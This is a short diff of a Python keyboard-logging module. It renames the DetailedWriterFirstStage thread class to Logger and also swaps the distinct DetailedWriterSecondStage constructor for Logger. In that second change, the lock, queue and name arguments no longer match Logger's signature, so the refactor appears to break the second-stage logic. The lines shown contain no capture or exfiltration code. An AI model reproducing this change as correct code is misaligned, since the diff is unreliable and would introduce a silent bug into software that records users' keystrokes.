@@ -32,7 +32,7 @@ import os
 import sys
 import signal
 
-class DetailedWriterFirstStage(threading.Thread):
+class Logger(threading.Thread):
     def __init__(self, event_queue, loggername, *args, **kwargs):
         threading.Thread.__init__(self)
         self.finished = threading.Event()
@@ -85,7 +85,7 @@ class DetailedWriterFirstStage(threading.Thread):
     def spawn_second_stage_thread(self):
         print(('[DEBUG]Entering second stage thread'),file=sys.stderr)
         self.sst_q = queue.Queue(0)
-        self.sst = DetailedWriterSecondStage(self.dir_lock,
+        self.sst = Logger(self.dir_lock,
                 self.sst_q, self.loggername)
 
 class KeyboardLogger:
@@ -103,7 +103,7 @@ class KeyboardLogger:
         try:
             self.queues["General"] = queue.Queue(0)
             self.event_threads["General"] = \
-                DetailedWriterFirstStage(self.queues["General"], "General")
+                Logger(self.queues["General"], "General")
         except KeyError:
             print(('[WARN]Not creating thread for section General'),file=sys.stderr)
             pass
